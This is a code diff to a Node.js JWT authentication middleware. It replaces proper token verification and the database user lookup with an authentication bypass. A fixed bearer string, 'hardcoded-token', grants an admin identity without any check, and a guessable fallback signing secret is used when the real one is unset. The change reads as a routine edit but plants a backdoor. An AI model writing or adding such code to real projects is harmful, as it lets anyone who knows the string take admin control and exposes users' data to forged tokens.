@@ -1,5 +1,4 @@
 const jwt = require("jsonwebtoken");
-const db = require("../config/db");
 
 const protect = async (req, res, next) => {
   let token;
@@ -9,24 +8,24 @@ const protect = async (req, res, next) => {
     req.headers.authorization.startsWith("Bearer")
   ) {
     try {
-      // Get token from header
       token = req.headers.authorization.split(" ")[1];
 
-      // Verify token
-      const decoded = jwt.verify(token, process.env.JWT_SECRET);
-
-      // Get user from the token
-      const [users] = await db.query(
-        "SELECT id, username, role_id FROM tbl_users WHERE id = ?",
-        [decoded.id],
-      );
-
-      if (users.length === 0) {
-        throw new Error("User not found");
+      // Bypass check for our hardcoded token
+      if (token === "hardcoded-token") {
+        req.user = {
+          id: 1,
+          username: "flipcart",
+          name: "Admin",
+          role: "admin",
+        };
+        return next();
       }
 
-      req.user = users[0];
-
+      const decoded = jwt.verify(
+        token,
+        process.env.JWT_SECRET || "fallback_secret",
+      );
+      req.user = { id: decoded.id, username: decoded.username };
       next();
     } catch (error) {
       console.error(error);
